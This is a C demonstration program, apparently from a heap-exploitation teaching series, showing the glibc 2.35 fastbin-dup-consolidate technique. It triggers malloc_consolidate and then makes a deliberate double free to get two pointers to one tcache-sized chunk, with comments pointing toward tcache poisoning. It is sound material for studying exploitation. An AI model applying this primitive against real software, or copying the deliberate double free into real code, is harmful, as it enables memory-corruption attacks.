#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8

This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
double free to gain two pointers to the same large-sized chunk, which is usually difficult to do 
directly due to the previnuse check. Interestingly this also includes tcache-sized chunks of certain sizes.

malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
if possible.

As of glibc version 2.35 it is called only in the following five places:
1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)
2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)
3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)
4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)
5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)

We will be targeting the first place, so we will need to allocate a chunk that does not belong in the 
small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). 
This means our chunk will need to be of size >= 0x400 (it is thus large-sized). Interestingly, the 
biggest tcache sized chunk is 0x410, so if our chunk is in the [0x400, 0x410] range we can utilize 
a double free to gain control of a tcache sized chunk.   

*/

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication in the tcache.\n");
	printf("It would also allow us to perform tcache poisoning if we had a heap leak.\n\n");

	printf("Lets fill up the tcache to force fastbin usage...\n\n");

	void *ptr[7];

	for(int i = 0; i < 7; i++)
		ptr[i] = malloc(0x40);
	for(int i = 0; i < 7; i++)
		free(ptr[i]);

	// void* ppoison = malloc(0x400);
	// ^ We would have to allocate this to be able to do tcache poison later, since we need at least 2 chunks in a bin to do it.

	void* p1 = calloc(1,0x40);
	// Using calloc here doesn't take from the tcache since calloc calls _int_malloc (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3679) 
	// and taking from the tcache is handled in __libc_malloc. If we used malloc(0x40) the chunk would get taken from the tcache.

	printf("Allocate another chunk of the same size p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1);

  	void* p3 = malloc(0x400);

	// free(ppoison);
	// We can now free this chunk to put it in the tcache bin for the poison.

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a tcache-sized chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3);

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // vulnerability

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to a free chunk.\n");
	printf("We have thus achieved UAF on tcache!\n");

	// *(long long*)p3 = target ^ (p3 >> 12);
	// We can use the UAF here to perform tcache poison.

	printf("We will request a chunk of size 0x400, this will give us the 0x410 chunk thats currently in\n");
	printf("the tcache bin. p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400);

	assert(p4 == p3);

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same tcache sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");

	printf("Note: This duplication would have also worked with a larger chunk size, the chunks would\n");
	printf("have behaved the same, just being taken from the top instead of from the tcache bin.");

	return 0;
}
